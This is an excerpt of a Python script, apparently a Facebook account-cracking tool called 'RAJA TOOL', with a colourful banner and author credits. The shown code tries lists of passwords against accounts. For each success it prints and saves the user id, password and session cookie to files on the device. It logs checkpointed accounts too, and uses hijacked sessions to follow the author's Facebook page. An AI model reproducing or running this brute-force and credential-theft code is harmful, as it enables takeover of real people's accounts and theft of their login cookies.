...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/Rk.modss')
        FD()
        return None
...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW MY FACEBOOK ACCOUNT')
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/Rk.modss', {
...
today = date.today()
logo =                                          ("""   
\033[1;32m       8888888b.   .d8888b.  
\033[1;35m       888   Y88b d88P  Y88b 
\033[1;35m       888    888 Y88b.      
\033[1;32m        888   d88P  "Y888b.   
\033[1;32m        8888888P"      "Y88b. 
\033[1;35m        888 T88b            "888 
\033[1;35m         888  T88b  Y88b  d88P 
\033[1;32m         888   T88b  "Y8888P"          
 
\033[1;37m================= \33[32;45mRAJA RIND\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mRAJA RIND\33[0;m\033[1;32m && \033[1;33mRAJARIND\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m راجا بلوچ
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mRaja-Baloch12
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mRAJA
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mRAJA\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO RAJA TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(RAJA-OK❤️)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RAJA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(RAJA-CP💔)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RAJA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[RAJA] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
